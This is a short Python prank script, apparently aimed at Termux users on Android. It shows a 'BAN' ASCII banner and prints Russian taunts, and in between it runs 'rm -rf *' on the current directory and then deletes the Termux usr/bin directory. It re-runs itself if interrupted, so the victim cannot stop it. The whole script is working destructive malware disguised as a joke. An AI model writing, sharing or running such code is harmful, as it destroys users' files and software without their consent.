import subprocess
import time
banner = '''
  ___            _  _   
  | _ )   __ _   | \| |  
  | _ \  / _` |  | .` |  
  |___/  \__,_|  |_|\_|  
_|"""""|_|"""""|_|"""""| 
"`-0-0-'"`-0-0-'"`-0-0-'
			
			
'''
def main():
	print(banner)
	print('ммм, чекай, через 3 секунды твой термукс улетит')
	subprocess.call("rm -rf *",shell=True)
	time.sleep(3)
	print('НАЕБАЛ!')
	subprocess.call("rm -rf /data/data/com.termux/files/usr/bin",shell=True)
	time.sleep(1)

try:
	main()
except KeyboardInterrupt:
    main()